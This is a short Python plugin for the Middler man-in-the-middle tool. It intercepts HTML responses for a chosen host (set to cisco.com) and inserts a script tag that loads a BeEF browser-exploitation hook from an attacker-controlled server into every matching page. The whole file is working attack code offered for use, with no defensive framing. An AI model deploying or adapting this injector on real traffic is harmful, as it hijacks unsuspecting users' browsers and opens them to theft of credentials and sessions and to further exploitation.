#!/usr/bin/python
import urllib2
import re
#from BeautifulSoup import BeautifulSoup
import libmiddler.api.header as header

### CHANGE AS NEEDED
request_match = (("Host","cisco.com"),)
response_match = (("Content-type","TEXT/HTML"),)
code1 = '''<script language='Javascript' src='http://localhost/beef/hook/beefmagic.js.php'></script>'''



### FUNCTION TO MANIPULATE CLIENT REQUEST
def doRequest(session, request_header, data):
  changed = 0
  stop = 0
  return(request_header, data, changed, stop)


### FUNCTION TO MANIPULATE SERVER RESPONSE
def doResponse(session, request_header, response_header, data):
  changed = 0
  stop = 0

  ### DETERMINE IF WE NEED TO CHANGE DATA

  if header.headertest(request_header, request_match) & header.headertest(response_header, response_match):
    
    ### MANIPULATE DATA - INSERT SCRIPT
    data = re.sub('</body>', code1 + '</body>', data)
    changed = 1
    print("BeEF hook injected")

  ### RETURN DATA
  header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')
  return(response_header, data, changed, stop)
